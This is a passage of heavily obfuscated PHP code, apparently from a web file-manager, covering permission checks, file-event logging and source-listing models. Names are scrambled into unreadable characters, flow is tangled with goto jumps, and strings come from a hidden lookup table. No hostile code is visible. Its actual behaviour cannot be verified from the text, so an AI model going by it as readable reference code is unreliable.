$dÒ‘ŞÙ­ñê))->select(); $aÄÂÎƒî˜æ = array(); if (!$cƒÜ¡³Àª) { return $aÄÂÎƒî˜æ; } foreach ($cƒÜ¡³Àª as $Bµ®™³Ëö) { $CéÚæ³ÓÑŞ = $this->authInfo($Bµ®™³Ëö); if (AuthModel::authCheckRoot($CéÚæ³ÓÑŞ[$Fˆ†˜È°ğ[373]])) { $aÄÂÎƒî˜æ[] = $Bµ®™³Ëö[$Fˆ†˜È°ğ[1412]]; } } return $aÄÂÎƒî˜æ; } private function authFolderOwnerUser($Cõ¦»—¡ìÚ) { $bôÕÙœ¦ë =& $_SERVER[¢à]; $A¯•åà–â“ = array(); $bƒ‰Ç•·œ· = !1; foreach ($Cõ¦»—¡ìÚ as $dÍÕãñ’¯) { $D¢©À»¿± = $this->authInfo($dÍÕãñ’¯); if ($dÍÕãñ’¯[$bôÕÙœ¦ë[452]] == $bôÕÙœ¦ë[464]) { $bƒ‰Ç•·œ· = !0; } if ($dÍÕãñ’¯[$bôÕÙœ¦ë[368]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($D¢©À»¿±[$bôÕÙœ¦ë[373]])) { $A¯•åà–â“[] = $dÍÕãñ’¯[$bôÕÙœ¦ë[452]]; } } } return array($bôÕÙœ¦ë[531] => $A¯•åà–â“, $bôÕÙœ¦ë[2234] => $bƒ‰Ç•·œ·); } public function authMake($A‘Öíìç•„) { goto d›Œêô ‡ä; BŒÕ»ÜÚÙ: $F¢œ¨Š° = 0; foreach ($A‘Öíìç•„ as $fƒ‹ÛÂãÚ) { $BˆÓ’óù = $this->authInfo($fƒ‹ÛÂãÚ); $dÁÚ‹ŒïÖ = $fƒ‹ÛÂãÚ[$aÄ®Şò¶á›[452]]; $CÎˆÁŞ = intval($BˆÓ’óù[$aÄ®Şò¶á›[373]]); if ($fƒ‹ÛÂãÚ[$aÄ®Şò¶á›[368]] == SourceModel::TYPE_USER && $dÁÚ‹ŒïÖ == USER_ID) { $cˆÊÃ•ñ´ = !0; $aƒ…îñÕ‹ = $BˆÓ’óù; $dÙÈ·˜»‘ = $CÎˆÁŞ; } else { if ($fƒ‹ÛÂãÚ[$aÄ®Şò¶á›[368]] == SourceModel::TYPE_GROUP && in_array($dÁÚ‹ŒïÖ, $fÅà£¸ŒŸ„)) { $fÑ¾°£ó¨ = !0; if ($CÎˆÁŞ >= $A·‡²ºã“) { $A·‡²ºã“ = $CÎˆÁŞ; $E®Üàø›Ó‰ = $BˆÓ’óù; } } else { if ($dÁÚ‹ŒïÖ == $aÄ®Şò¶á›[464]) { $F¢œ¨Š° = !0; $eÜÎÅñ£¼„ = $BˆÓ’óù; $b÷‰¯Ì¼ï‹ = $CÎˆÁŞ; } } } } $BË­Çæõ† = $cˆÊÃ•ñ´ ? $dÙÈ·˜»‘ : ($fÑ¾°£ó¨ ? $A·‡²ºã“ : $b÷‰¯Ì¼ï‹); goto FÉİÒã‚éŞ; C¸æñ™ŸÎ: $eÜÎÅñ£¼„ = 0; $cˆÊÃ•ñ´ = 0; $fÑ¾°£ó¨ = 0; goto BŒÕ»ÜÚÙ; FÉİÒã‚éŞ: $BˆÓ’óù = $cˆÊÃ•ñ´ ? $aƒ…îñÕ‹ : ($fÑ¾°£ó¨ ? $E®Üàø›Ó‰ : $eÜÎÅñ£¼„); $Bù–”¯™ê = array($aÄ®Şò¶á›[2231] => intval($BË­Çæõ†), $aÄ®Şò¶á›[2232] => $BˆÓ’óù); return $Bù–”¯™ê; goto fâî¹ñÕ§³; DËğœÚõ¸‘: $b÷‰¯Ì¼ï‹ = 0; $aƒ…îñÕ‹ = 0; $E®Üàø›Ó‰ = 0; goto C¸æñ™ŸÎ; d›Œêô ‡ä: $aÄ®Şò¶á› =& $_SERVER[¢à]; if (!$A‘Öíìç•„) { return array($aÄ®Şò¶á›[374] => 0, $aÄ®Şò¶á›[414] => !1); } $CåÈß™Å¿ = Session::get($aÄ®Şò¶á›[2187]); goto b²Çœˆâ—à; b²Çœˆâ—à: $fÅà£¸ŒŸ„ = array_to_keyvalue($CåÈß™Å¿, $aÄ®Şò¶á›[33], $aÄ®Şò¶á›[2075]); $dÙÈ·˜»‘ = 0; $A·‡²ºã“ = 0; goto DËğœÚõ¸‘; fâî¹ñÕ§³: } public function authTargetInfoMake($eØÌŞì¢¬Ó) { goto BÛğ«í…“ã; F¸æ¥ìÃ§ê: foreach ($eØÌŞì¢¬Ó as $dÔ­œš«È) { if ($dÔ­œš«È[$CÂ’äËó»Õ[368]] == SourceModel::TYPE_USER) { $F¹ÜÇ¿‡õ[] = intval($dÔ­œš«È[$CÂ’äËó»Õ[452]]); } else { if ($dÔ­œš«È[$CÂ’äËó»Õ[368]] == SourceModel::TYPE_GROUP) { $Aã§‹ˆ»ÅÒ[] = intval($dÔ­œš«È[$CÂ’äËó»Õ[452]]); } } } if ($F¹ÜÇ¿‡õ) { $F¹ÜÇ¿‡õ = Model($CÂ’äËó»Õ[470])->userListInfo($F¹ÜÇ¿‡õ); } if ($Aã§‹ˆ»ÅÒ) { $B§Úƒ·˜¨„ = array($CÂ’äËó»Õ[2147] => array($CÂ’äËó»Õ[381], $Aã§‹ˆ»ÅÒ)); $Aã§‹ˆ»ÅÒ = Model($CÂ’äËó»Õ[454])->field($CÂ’äËó»Õ[2160])->where($B§Úƒ·˜¨„)->select(); $Aã§‹ˆ»ÅÒ = array_to_keyvalue($Aã§‹ˆ»ÅÒ, $CÂ’äËó»Õ[2075]); } goto fƒÄâÓ«Éê; fƒÄâÓ«Éê: return array($CÂ’äËó»Õ[2236] => $F¹ÜÇ¿‡õ, $CÂ’äËó»Õ[2237] => $Aã§‹ˆ»ÅÒ); goto Fì¹®ÛÍ‡; BÛğ«í…“ã: $CÂ’äËó»Õ =& $_SERVER[¢à]; $F¹ÜÇ¿‡õ = array(); $Aã§‹ˆ»ÅÒ = array(); goto F¸æ¥ìÃ§ê; Fì¹®ÛÍ‡: } private function authInfo($Eº÷¼ƒØÒ£) { $e¦ó”Œ¾±‡ =& $_SERVER[¢à]; if ($Eº÷¼ƒØÒ£[$e¦ó”Œ¾±‡[2203]]) { $fŞ²ÎÒè÷ = Model($e¦ó”Œ¾±‡[2222])->listData($Eº÷¼ƒØÒ£[$e¦ó”Œ¾±‡[2203]]); if (!$fŞ²ÎÒè÷) { return !1; $D§ÎµìÖ‚ = Model($e¦ó”Œ¾±‡[2222])->listData(); $e­íÔëé¯ = array_filter_by_field($D§ÎµìÖ‚, $e¦ó”Œ¾±‡[373], $e¦ó”Œ¾±‡[464]); return $e­íÔëé¯; } $F¸·è¹‰¿‘ = array_field_key($fŞ²ÎÒè÷, array($e¦ó”Œ¾±‡[364], $e¦ó”Œ¾±‡[28], $e¦ó”Œ¾±‡[373], $e¦ó”Œ¾±‡[2093], $e¦ó”Œ¾±‡[2096])); $F¸·è¹‰¿‘[$e¦ó”Œ¾±‡[2238]] = $Eº÷¼ƒØÒ£; return $F¸·è¹‰¿‘; } else { return array($e¦ó”Œ¾±‡[382] => 0, $e¦ó”Œ¾±‡[2081] => $Eº÷¼ƒØÒ£[$e¦ó”Œ¾±‡[2204]], $e¦ó”Œ¾±‡[383] => $e¦ó”Œ¾±‡[33], $e¦ó”Œ¾±‡[2093] => $e¦ó”Œ¾±‡[2239]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\143\145\x5f\x65\x76\145\x6e\x74"; protected $dataAuto = array(array("\x63\162\145\x61\164\145\124\x69\155\x65", "\164\151\x6d\145", "\x69\x6e\163\x65\x72\164", "\x66\165\x6e\x63\x74\x69\x6f\x6e"), array("\144\x65\163\x63", '', "\x69\x6e\x73\x65\162\x74\54\165\160\x64\141\164\x65\54\163\145\154\x65\143\x74", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($BÑª…¶£½†, $AÒè®³¬ª, $f÷Êò¨Ë¥¹ = '') { goto e°´¥’Æ˜; dç‰˜¸êÍ: $dĞ¼´ä‚ïÄ = array($Aë»„ÖÈ•[380] => $BÑª…¶£½†, $Aë»„ÖÈ•[2240] => $Bíš„ìî¾÷[$Aë»„ÖÈ•[457]], $Aë»„ÖÈ•[2241] => $Bíš„ìî¾÷[$Aë»„ÖÈ•[28]], $Aë»„ÖÈ•[462] => $Bíš„ìî¾÷[$Aë»„ÖÈ•[462]], $Aë»„ÖÈ•[1403] => USER_ID, $Aë»„ÖÈ•[385] => $AÒè®³¬ª, $Aë»„ÖÈ•[1405] => $f÷Êò¨Ë¥¹); $this->addSystemLog($AÒè®³¬ª, $dĞ¼´ä‚ïÄ); return $this->add($dĞ¼´ä‚ïÄ); goto C“Øˆ±è¥; fƒÊİ¥Ê‘: if (!$Bíš„ìî¾÷) { return !1; } if ($this->isCacheEvent($Bíš„ìî¾÷, $AÒè®³¬ª)) { return; } if ($f÷Êò¨Ë¥¹ && is_string($f÷Êò¨Ë¥¹)) { $f÷Êò¨Ë¥¹ = array($Aë»„ÖÈ•[2105] => $f÷Êò¨Ë¥¹); } goto dç‰˜¸êÍ; e°´¥’Æ˜: $Aë»„ÖÈ• =& $_SERVER[¢à]; if (!$this->eventSave) { return; } $Bíš„ìî¾÷ = Model($Aë»„ÖÈ•[1106])->sourceInfo($BÑª…¶£½†); goto fƒÊİ¥Ê‘; C“Øˆ±è¥: } private function addSystemLog($C¢œ‰±ÙåÊ, $E£Ö…ã„Ï‡) { $cÖ˜¨ƒæ– =& $_SERVER[¢à]; if ($C¢œ‰±ÙåÊ == $cÖ˜¨ƒæ–[2242]) { $C¢œ‰±ÙåÊ = $E£Ö…ã„Ï‡[$cÖ˜¨ƒæ–[401]][$cÖ˜¨ƒæ–[2243]]; } else { if (in_array($C¢œ‰±ÙåÊ, array($cÖ˜¨ƒæ–[2052], $cÖ˜¨ƒæ–[2244]))) { $C¢œ‰±ÙåÊ = $E£Ö…ã„Ï‡[$cÖ˜¨ƒæ–[401]][$cÖ˜¨ƒæ–[692]]; } } $cİ×ë’¼ = array_merge($E£Ö…ã„Ï‡, array($cÖ˜¨ƒæ–[2245] => $E£Ö…ã„Ï‡[$cÖ˜¨ƒæ–[366]], $cÖ˜¨ƒæ–[2246] => $E£Ö…ã„Ï‡[$cÖ˜¨ƒæ–[2246]])); Model($cÖ˜¨ƒæ–[2016])->addLog($cÖ˜¨ƒæ–[2247] . $C¢œ‰±ÙåÊ, $cİ×ë’¼); } private function isCacheEvent($Cˆï““¿Ñ, $DÊÈÃ‡ºƒê) { if ($Cˆï““¿Ñ[$_SERVER[¢à][368]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($F¿¾í—ø‚Œ, $F¸ÂÒè£µÁ) { $eÄÛ¥‚ù½ =& $_SERVER[¢à]; $d›­ËÚÆåÅ = Model($eÄÛ¥‚ù½[1106])->sourceInfo($F¿¾í—ø‚Œ); $C³Š¿½ßŞ = array($eÄÛ¥‚ù½[2243] => $F¸ÂÒè£µÁ, $eÄÛ¥‚ù½[28] => $d›­ËÚÆåÅ[$eÄÛ¥‚ù½[28]]); return $this->addEvent($F¿¾í—ø‚Œ, $eÄÛ¥‚ù½[2242], $C³Š¿½ßŞ); } public function eventFileEdit($c²Å°×µÜ) { $b©©‘â³òÂ =& $_SERVER[¢à]; $BÄøì†±îÈ = array($b©©‘â³òÂ[2248] => $_SERVER[$b©©‘â³òÂ[2249]], $b©©‘â³òÂ[1722] => strtolower(ACTION)); return $this->addEvent($c²Å°×µÜ, $b©©‘â³òÂ[2043], $BÄøì†±îÈ); } public function eventRecycle($aÉŒ˜ÉÃÖ, $Fš÷¾¶õïÅ) { return $this->addEvent($aÉŒ˜ÉÃÖ, $_SERVER[¢à][2244], $Fš÷¾¶õïÅ); } public function eventRemove($BÔŞì¬Ä¢Ÿ) { $DîñáƒÏ =& $_SERVER[¢à]; $c…¬ÅƒĞ· = Model($DîñáƒÏ[1106])->sourceInfo($BÔŞì¬Ä¢Ÿ); $F²¹Üİß‰¨ = $c…¬ÅƒĞ·[$DîñáƒÏ[28]]; return $this->addEvent($c…¬ÅƒĞ·[$DîñáƒÏ[457]], $DîñáƒÏ[2042], $F²¹Üİß‰¨); } public function eventShare($E¼…ˆÌ¼ÙÒ, $dóœ«•ÕºÖ) { return $this->addEvent($E¼…ˆÌ¼ÙÒ, $_SERVER[¢à][2052], $dóœ«•ÕºÖ); } public function eventMove($F¬ÄÚÍõÖ, $a´˜ˆæ©îÊ, $bŞÕÆà÷ù) { goto F³¹ßÖéğô; F³¹ßÖéğô: $eµÍæ¢Ëó³ =& $_SERVER[¢à]; $BÜ«¥Ôº’õ = Model($eµÍæ¢Ëó³[1106]); $EÖô“©•Ì = $BÜ«¥Ôº’õ->sourceInfo($F¬ÄÚÍõÖ); goto FÌÖ‹†™ç£; fÉˆåë²é§: $this->addEvent($a´˜ˆæ©îÊ, $eµÍæ¢Ëó³[2254], $A§à•àŒÁ); goto D½§¹’ªí; b˜„¯öéäç: $this->addEvent($F¬ÄÚÍõÖ, $eµÍæ¢Ëó³[488], $A§à•àŒÁ); $EÖô“©•Ì = $BÜ«¥Ôº’õ->sourceInfo($F¬ÄÚÍõÖ); $A§à•àŒÁ = array($eµÍæ¢Ëó³[366] => $EÖô“©•Ì[$eµÍæ¢Ëó³[366]], $eµÍæ¢Ëó³[28] => $EÖô“©•Ì[$eµÍæ¢Ëó³[28]]); goto fÉˆåë²é§; FÌÖ‹†™ç£: $CæË†³¯‰Ù = $BÜ«¥Ôº’õ->sourceInfo($a´˜ˆæ©îÊ); $aö‰­ª”¡ = $BÜ«¥Ôº’õ->sourceInfo($bŞÕÆà÷ù); $A§à•àŒÁ = array($eµÍæ¢Ëó³[1002] => $a´˜ˆæ©îÊ, $eµÍæ¢Ëó³[2250] => $CæË†³¯‰Ù[$eµÍæ¢Ëó³[28]], $eµÍæ¢Ëó³[2251] => $CæË†³¯‰Ù[$eµÍæ¢Ëó³[462]], $eµÍæ¢Ëó³[1003] => $bŞÕÆà÷ù, $eµÍæ¢Ëó³[2252] => $aö‰­ª”¡[$eµÍæ¢Ëó³[28]], $eµÍæ¢Ëó³[2253] => $aö‰­ª”¡[$eµÍæ¢Ëó³[462]]); goto b˜„¯öéäç; D½§¹’ªí: } public function eventCopy($D…˜„Âì®Œ) { $this->eventCreate($D…˜„Âì®Œ, $_SERVER[¢à][486]); } public function eventRename($A…Œ¯¨¼·Ô, $c¿ÚæêÔĞâ, $c‰º­ÅÎ÷˜) { $f‚ĞªˆïŠ =& $_SERVER[¢à]; $dƒ±‚òˆš = array($f‚ĞªˆïŠ[1002] => $c¿ÚæêÔĞâ, $f‚ĞªˆïŠ[1003] => $c‰º­ÅÎ÷˜); return $this->addEvent($A…Œ¯¨¼·Ô, $f‚ĞªˆïŠ[1119], $dƒ±‚òˆš); } public function eventAddComment($DáøŠª—ƒÅ, $A¦’˜¿àÆ‰) { return $this->addEvent($DáøŠª—ƒÅ, $_SERVER[¢à][2255], $A¦’˜¿àÆ‰); } public function eventAddDesc($d³–Ç›ŞŒ, $b‡åÖ¥ƒ·Ã) { return $this->addEvent($d³–Ç›ŞŒ, $_SERVER[¢à][2256], $b‡åÖ¥ƒ·Ã); } public function listBySource($B¾É¼ñÍÅ) { goto e¡ÀÕù´ä‡; C‹¼¨àŒ: if ($dæö½ÇõÂÃ[$CîÜ¥ËÄÓ[367]] == $CîÜ¥ËÄÓ[83]) { $b¬×æ®ÌØí = Model($CîÜ¥ËÄÓ[1106])->listSearchChildren($B¾É¼ñÍÅ, 20000); $b¬×æ®ÌØí[] = $B¾É¼ñÍÅ . $CîÜ¥ËÄÓ[358]; $EøëÙËÙÂ = array($CîÜ¥ËÄÓ[366] => array($CîÜ¥ËÄÓ[7], $b¬×æ®ÌØí)); } $BÄ’å¡Êñ” = $this->where($EøëÙËÙÂ)->order($CîÜ¥ËÄÓ[2257])->selectPage(); if ($BÄ’å¡Êñ”[$CîÜ¥ËÄÓ[348]][$CîÜ¥ËÄÓ[349]] == 0) { $BÄ’å¡Êñ”[$CîÜ¥ËÄÓ[348]][$CîÜ¥ËÄÓ[349]] = 1; $BÄ’å¡Êñ”[$CîÜ¥ËÄÓ[351]] = array(array($CîÜ¥ËÄÓ[380] => $B¾É¼ñÍÅ, $CîÜ¥ËÄÓ[2240] => $dæö½ÇõÂÃ[$CîÜ¥ËÄÓ[457]], $CîÜ¥ËÄÓ[1403] => $dæö½ÇõÂÃ[$CîÜ¥ËÄÓ[375]], $CîÜ¥ËÄÓ[385] => $CîÜ¥ËÄÓ[2258], $CîÜ¥ËÄÓ[386] => $dæö½ÇõÂÃ[$CîÜ¥ËÄÓ[184]], $CîÜ¥ËÄÓ[1405] => $CîÜ¥ËÄÓ[33])); } goto BöŒ¿´÷Çí; e¡ÀÕù´ä‡: $CîÜ¥ËÄÓ =& $_SERVER[¢à]; $dæö½ÇõÂÃ = Model($CîÜ¥ËÄÓ[1106])->sourceInfo($B¾É¼ñÍÅ); $EøëÙËÙÂ = array($CîÜ¥ËÄÓ[380] => $B¾É¼ñÍÅ); goto C‹¼¨àŒ; BöŒ¿´÷Çí: $BÄ’å¡Êñ” = $this->eventListParse($BÄ’å¡Êñ”, $B¾É¼ñÍÅ); show_json($BÄ’å¡Êñ”); goto fğÆ«¬ô„í; fğÆ«¬ô„í: } private function eventListParse($BË Ç·¸…ò, $D»ÉÃ¡à†) { goto D•¯Ç¦Ã°õ; D•¯Ç¦Ã°õ: $cÓë‡‘†‚ =& $_SERVER[¢à]; $A¶¹çØàåæ = $BË Ç·¸…ò[$cÓë‡‘†‚[351]]; $dÙªë—Œ = array_to_keyvalue($A¶¹çØàåæ, $cÓë‡‘†‚[33], $cÓë‡‘†‚[366]); goto AÚÃò»ãã; bù‰ºìÂ›: $Eƒ¾³‰Ûñæ = Model($cÓë‡‘†‚[752])->sourceListInfo($dÙªë—Œ, !0); foreach ($A¶¹çØàåæ as &$EÈÔ²ã®î) { if ($EÈÔ²ã®î[$cÓë‡‘†‚[29]] == $cÓë‡‘†‚[488] && isset($EÈÔ²ã®î[$cÓë‡‘†‚[401]][$cÓë‡‘†‚[1002]])) { $EÈÔ²ã®î[$cÓë‡‘†‚[401]][$cÓë‡‘†‚[1002]] = $Eƒ¾³‰Ûñæ[$EÈÔ²ã®î[$cÓë‡‘†‚[401]][$cÓë‡‘†‚[1002]]]; $EÈÔ²ã®î[$cÓë‡‘†‚[401]][$cÓë‡‘†‚[1003]] = $Eƒ¾³‰Ûñæ[$EÈÔ²ã®î[$cÓë‡‘†‚[401]][$cÓë‡‘†‚[1003]]]; } if ($EÈÔ²ã®î[$cÓë‡‘†‚[29]] == $cÓë‡‘†‚[2254] && isset($EÈÔ²ã®î[$cÓë‡‘†‚[401]][$cÓë‡‘†‚[366]])) { $EÈÔ²ã®î[$cÓë‡‘†‚[401]][$cÓë‡‘†‚[366]] = $Eƒ¾³‰Ûñæ[$EÈÔ²ã®î[$cÓë‡‘†‚[401]][$cÓë‡‘†‚[366]]]; } $EÈÔ²ã®î[$cÓë‡‘†‚[388]] = $Eƒ¾³‰Ûñæ[$EÈÔ²ã®î[$cÓë‡‘†‚[366]]]; $EÈÔ²ã®î[$cÓë‡‘†‚[2259]] = $Eƒ¾³‰Ûñæ[$EÈÔ²ã®î[$cÓë‡‘†‚[2246]]]; if ($EÈÔ²ã®î[$cÓë‡‘†‚[29]] == $cÓë‡‘†‚[2042]) { $EÈÔ²ã®î[$cÓë‡‘†‚[2259]] = $EÈÔ²ã®î[$cÓë‡‘†‚[388]]; $EÈÔ²ã®î[$cÓë‡‘†‚[2246]] = $EÈÔ²ã®î[$cÓë‡‘†‚[2259]][$cÓë‡‘†‚[366]]; $EÈÔ²ã®î[$cÓë‡‘†‚[388]] = !1; $EÈÔ²ã®î[$cÓë‡‘†‚[366]] = $cÓë‡‘†‚[33]; } $EÈÔ²ã®î[$cÓë‡‘†‚[2212]] = $dìŒ…¼Ç‰Û[$EÈÔ²ã®î[$cÓë‡‘†‚[1412]]]; } $BË Ç·¸…ò[$cÓë‡‘†‚[351]] = $A¶¹çØàåæ; goto bå¹Øäõ»; fÜª‡Óİº‹: $dÙªë—Œ = array_unique($dÙªë—Œ); $b±Œà­ÚÆ = array_unique(array_to_keyvalue($A¶¹çØàåæ, $cÓë‡‘†‚[33], $cÓë‡‘†‚[1412])); $dìŒ…¼Ç‰Û = Model($cÓë‡‘†‚[473])->userListInfo($b±Œà­ÚÆ); goto bù‰ºìÂ›; bå¹Øäõ»: return $BË Ç·¸…ò; goto A›¥‡…êÊ; AÚÃò»ãã: $B‰ŸáÑê• = array_to_keyvalue($A¶¹çØàåæ, $cÓë‡‘†‚[33], $cÓë‡‘†‚[2246]); foreach ($A¶¹çØàåæ as $EÈÔ²ã®î) { $c‚Òâ‰²É™ = $EÈÔ²ã®î[$cÓë‡‘†‚[401]]; if ($EÈÔ²ã®î[$cÓë‡‘†‚[29]] == $cÓë‡‘†‚[488] && isset($c‚Òâ‰²É™[$cÓë‡‘†‚[1002]])) { $dÙªë—Œ[] = $c‚Òâ‰²É™[$cÓë‡‘†‚[1002]] . $cÓë‡‘†‚[33]; $dÙªë—Œ[] = $c‚Òâ‰²É™[$cÓë‡‘†‚[1003]] . $cÓë‡‘†‚[33]; } if ($EÈÔ²ã®î[$cÓë‡‘†‚[29]] == $cÓë‡‘†‚[2254] && isset($c‚Òâ‰²É™[$cÓë‡‘†‚[366]])) { $dÙªë—Œ[] = $c‚Òâ‰²É™[$cÓë‡‘†‚[366]] . $cÓë‡‘†‚[33]; } } $dÙªë—Œ = array_merge($dÙªë—Œ, $B‰ŸáÑê•, array($D»ÉÃ¡à† . $cÓë‡‘†‚[33])); goto fÜª‡Óİº‹; A›¥‡…êÊ: } public function removeBySource($C‹Ğã¹îª·) { $bÁïÌ±æ– = array($_SERVER[¢à][380] => $C‹Ğã¹îª·); $this->where($bÁïÌ±æ–)->remove(); } } goto DÒ—Š´Í×Ã; d£©»¬ÇÃ°: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\165\162\143\x65"; protected $tableMeta = array("\164\x61\142\x6c\145\116\x61\x6d\x65" => "\x69\x6f\137\x73\157\165\x72\x63\x65\137\x6d\145\164\141", "\x6d\x65\x74\141\106\151\145\154\x64" => "\163\157\165\x72\143\145\111\104"); protected $dataAuto = array(array("\155\157\144\x69\x66\171\124\x69\155\x65", "\164\151\155\x65", "\x69\156\163\x65\x72\x74", "\146\165\x6e\x63\x74\151\157\x6e"), array("\143\x72\145\141\164\x65\x54\x69\x6d\x65", "\x74\151\x6d\145", "\x69\156\163\145\162\164", "\x66\165\x6e\x63\x74\151\x6f\156"), array("\166\151\145\x77\124\x69\155\145", "\164\151\155\x65", "\x69\156\163\x65\x72\x74", "\x66\x75\x6e\x63\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($bÆƒ¶Ôµ­) { return $this->listSource(array($_SERVER[¢à][365] => $bÆƒ¶Ôµ­)); } public function typeName($fâë¯ˆìĞĞ) { static $aÅ‰ÚâêõÀ = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\145\155", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\x67\162\157\165\x70"); return $aÅ‰ÚâêõÀ[$fâë¯ˆìĞĞ . $_SERVER[¢à][33]]; } public function sourceListInfo($A„àÛÈËÓÇ, $Cêİ²øêÃô = false) { goto F›†³ ®øø; F›¿ïÛØ„å: if (!$A„àÛÈËÓÇ) { return array(); } $b™¼‰‡—îŸ = $this->where(array($BÙ÷¶œÃç[366] => array($BÙ÷¶œÃç[7], $A„àÛÈËÓÇ)))->select(); $this->_listDataApply($b™¼‰‡—îŸ, $Cêİ²øêÃô); goto BŞÜâÇ«¨˜; BŞÜâÇ«¨˜: return array_to_keyvalue($b™¼‰‡—îŸ, $BÙ÷¶œÃç[366]); goto AÇŸÎÖöÏÇ; F›†³ ®øø: $BÙ÷¶œÃç =& $_SERVER[¢à]; $A„àÛÈËÓÇ = $A„àÛÈËÓÇ ? $A„àÛÈËÓÇ : array(); $A„àÛÈËÓÇ = array_filter(array_unique($A„àÛÈËÓÇ)); goto F›¿ïÛØ„å; AÇŸÎÖöÏÇ: } public function pathInfoFilter($e³æ±ÈÛ) { goto D×íä«¢ê; B¿»«´Ü–: if (isset($e³æ±ÈÛ[$f­Ñ¾§ºó£[373]]) && $e³æ±ÈÛ[$f­Ñ¾§ºó£[373]][$f­Ñ¾§ºó£[374]] == -1) { $d…ÆİˆÌ­ = array_remove_value($d…ÆİˆÌ­, $f­Ñ¾§ºó£[184]); $d…ÆİˆÌ­ = array_remove_value($d…ÆİˆÌ­, $f­Ñ¾§ºó£[107]); $d…ÆİˆÌ­ = array_remove_value($d…ÆİˆÌ­, $f­Ñ¾§ºó£[375]); $d…ÆİˆÌ­ = array_remove_value($d…ÆİˆÌ­, $f­Ñ¾§ºó£[376]); $d…ÆİˆÌ­ = array_remove_value($d…ÆİˆÌ­, $f­Ñ¾§ºó£[77]); $d…ÆİˆÌ­ = array_remove_value($d…ÆİˆÌ­, $f­Ñ¾§ºó£[377]); } $e³æ±ÈÛ = array_field_key($e³æ±ÈÛ, $d…ÆİˆÌ­); return $e³æ±ÈÛ; goto Fšñ†³òËÄ; EŒ«×±èõÔ: $e³æ±ÈÛ[$f­Ñ¾§ºó£[368]] = $this->typeName($e³æ±ÈÛ[$f­Ñ¾§ºó£[368]]); if ($e³æ±ÈÛ[$f­Ñ¾§ºó£[367]] != 1) { $e³æ±ÈÛ[$f­Ñ¾§ºó£[157]] = $e³æ±ÈÛ[$f­Ñ¾§ºó£[369]]; unset($e³æ±ÈÛ[$f­Ñ¾§ºó£[369]]); } $C¼ŞÙµµ×÷ = $f­Ñ¾§ºó£[370]; goto CàÎ·¶—«¤; CàÎ·¶—«¤: $C¼ŞÙµµ×÷ .= $f­Ñ¾§ºó£[371]; $C¼ŞÙµµ×÷ .= $f­Ñ¾§ºó£[372]; $d…ÆİˆÌ­ = explode($f­Ñ¾§ºó£[47], $C¼ŞÙµµ×÷); goto B¿»«´Ü–; D×íä«¢ê: $f­Ñ¾§ºó£ =& $_SERVER[¢à]; $e³æ±ÈÛ[$f­Ñ¾§ºó£[75]] = KodIO::make($e³æ±ÈÛ[$f­Ñ¾§ºó£[366]]); $e³æ±ÈÛ[$f­Ñ¾§ºó£[29]] = $e³æ±ÈÛ[$f­Ñ¾§ºó£[367]] == 1 ? $f­Ñ¾§ºó£[76] : $f­Ñ¾§ºó£[164]; goto EŒ«×±èõÔ; Fšñ†³òËÄ: } public function listUserFav() { goto D¨¼Û©àãÇ; D¨¼Û©àãÇ: $aÌ—İ¯™àõ =& $_SERVER[¢à]; $bïô¶â¹™ƒ = Model($aÌ—İ¯™àõ[378])->listData(); $bÓÆ½ö™†Ã = array_filter_by_field($bïô¶â¹™ƒ, $aÌ—İ¯™àõ[29], $aÌ—İ¯™àõ[379]); goto aœÊÛÒ©÷Æ; BÑÌ‰âé¿: foreach ($bïô¶â¹™ƒ as &$ağ½¬ÌÒ¼“) { $ağ½¬ÌÒ¼“ = array($aÌ—İ¯™àõ[382] => $ağ½¬ÌÒ¼“[$aÌ—İ¯™àõ[364]], $aÌ—İ¯™àõ[383] => $ağ½¬ÌÒ¼“[$aÌ—İ¯™àõ[28]], $aÌ—İ¯™àõ[384] => $ağ½¬ÌÒ¼“[$aÌ—İ¯™àõ[75]], $aÌ—İ¯™àõ[385] => $ağ½¬ÌÒ¼“[$aÌ—İ¯™àõ[29]], $aÌ—İ¯™àõ[386] => $ağ½¬ÌÒ¼“[$aÌ—İ¯™àõ[184]], $aÌ—İ¯™àõ[387] => $ağ½¬ÌÒ¼“[$aÌ—İ¯™àõ[107]]); if ($ağ½¬ÌÒ¼“[$aÌ—İ¯™àõ[29]] == $aÌ—İ¯™àõ[379] && $cï¹ÒŸŒÀõ[$ağ½¬ÌÒ¼“[$aÌ—İ¯™àõ[75]]]) { $ağ½¬ÌÒ¼“[$aÌ—İ¯™àõ[388]] = $cï¹ÒŸŒÀõ[$ağ½¬ÌÒ¼“[$aÌ—İ¯™àõ[75]]]; } } return $bïô¶â¹™ƒ; goto BÊ¸¹ëˆ‘ß; aœÊÛÒ©÷Æ: $bÓÆ½ö™†Ã = array_to_keyvalue($bÓÆ½ö™†Ã, $aÌ—İ¯™àõ[33], $aÌ—İ¯™àõ[75]); if ($bÓÆ½ö™†Ã) { $cï¹ÒŸŒÀõ = $this->listSource(array($aÌ—İ¯™àõ[380] => array($aÌ—İ¯™àõ[381], $bÓÆ½ö™†Ã))); } $cï¹ÒŸŒÀõ = array_to_keyvalue($cï¹ÒŸŒÀõ[$aÌ—İ¯™àõ[351]], $aÌ—İ¯™àõ[366]); goto BÑÌ‰âé¿; BÊ¸¹ëˆ‘ß: } public function listUserTag($a‰™çÇó»ê) { goto eÈ¿Œ’Ş†²; Fñ«Ìîªš³: $DäôŒóƒó™ = array_to_keyvalue($DäôŒóƒó™, $c‰êòºÌµ¢[33], $c‰êòºÌµ¢[75]); if (!$DäôŒóƒó™) { return array(); } $B¢ó•‘ÖÜˆ = array($c‰êòºÌµ¢[380] => array($c‰êòºÌµ¢[381], $DäôŒóƒó™)); goto fĞ‘ğ Ë‡Ã; fĞ‘ğ Ë‡Ã: return $this->listSource($B¢ó•‘ÖÜˆ); goto bŠåæÏƒÄ‘; eÈ¿Œ’Ş†²: $c‰êòºÌµ¢ 